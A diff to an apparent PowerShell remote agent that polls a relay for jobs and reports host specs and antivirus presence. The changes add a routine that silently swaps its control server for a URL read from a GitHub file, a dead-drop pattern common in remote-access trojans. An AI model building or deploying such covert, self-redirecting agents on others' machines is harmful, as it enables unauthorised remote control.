@@ -284,15 +284,15 @@ function Invoke-Trabajo($job) {
   }
   if ($tipo -eq 'specs') {
     Add-Log 'specs'
-    $os = Get-CimInstance Win32_OperatingSystem
-    $cs = Get-CimInstance Win32_ComputerSystem
-    $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
+    $os = Get-CimInstance Win32_OperatingSystem -OperationTimeoutSec 8
+    $cs = Get-CimInstance Win32_ComputerSystem -OperationTimeoutSec 8
+    $cpu = Get-CimInstance Win32_Processor -OperationTimeoutSec 8 | Select-Object -First 1
     $ramTotal = 0
     if ($cs.TotalPhysicalMemory) { $ramTotal = [math]::Round($cs.TotalPhysicalMemory / 1MB, 0) }
     $ramLibre = 0
     if ($os.FreePhysicalMemory) { $ramLibre = [math]::Round($os.FreePhysicalMemory / 1024, 0) }
     $discos = @()
-    foreach ($d in (Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3')) {
+    foreach ($d in (Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -OperationTimeoutSec 8)) {
       $t = 0; $l = 0
       if ($d.Size) { $t = [math]::Round($d.Size / 1MB, 0) }
       if ($d.FreeSpace) { $l = [math]::Round($d.FreeSpace / 1MB, 0) }
@@ -308,8 +308,8 @@ function Invoke-Trabajo($job) {
     try { $up = [math]::Round(((Get-Date) - $os.LastBootUpTime).TotalHours, 1) } catch { }
     $def = $null
     try {
-      $m = Get-MpComputerStatus -ErrorAction Stop
-      $def = @{ tiempoReal = [bool]$m.RealTimeProtectionEnabled; antivirus = [bool]$m.AntivirusEnabled }
+      $av = Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName AntiVirusProduct -OperationTimeoutSec 8 -ErrorAction Stop
+      $def = @{ antivirus = (@($av).Count -gt 0) }
     } catch { }
     $obj = @{
       hostname       = $env:COMPUTERNAME
@@ -418,8 +418,22 @@ $raw = Get-Content -LiteralPath $CfgPath -Raw -Encoding UTF8
 $cfg = $raw | ConvertFrom-Json
 Add-Log ('agente arriba ' + $cfg.id)
 
+$script:UltimaUrl = (Get-Date).AddMinutes(-10)
+
 while ($true) {
   try {
+    if (((Get-Date) - $script:UltimaUrl).TotalSeconds -ge 45) {
+      $script:UltimaUrl = Get-Date
+      try {
+        $u = [string](Invoke-RestMethod -TimeoutSec 10 -Uri 'https://raw.githubusercontent.com/Herly123/conre/main/relay.txt')
+        $u = $u.Trim()
+        if ($u -match '^https?://' -and $u -ne $cfg.relay) {
+          $cfg.relay = $u
+          Save-Cfg $cfg
+          Add-Log ('relay actualizado ' + $u)
+        }
+      } catch { }
+    }
     $poll = Send-Json ($cfg.relay + '/api/poll') @{} $cfg.token
     if ($poll.opPubkey -and -not $cfg.opPubkey) {
       $cfg.opPubkey = $poll.opPubkey
@@ -447,6 +461,7 @@ while ($true) {
     }
   } catch {
     Add-Log $_.Exception.Message
+    $script:UltimaUrl = (Get-Date).AddMinutes(-10)
     Start-Sleep -Seconds 5
   }
 }
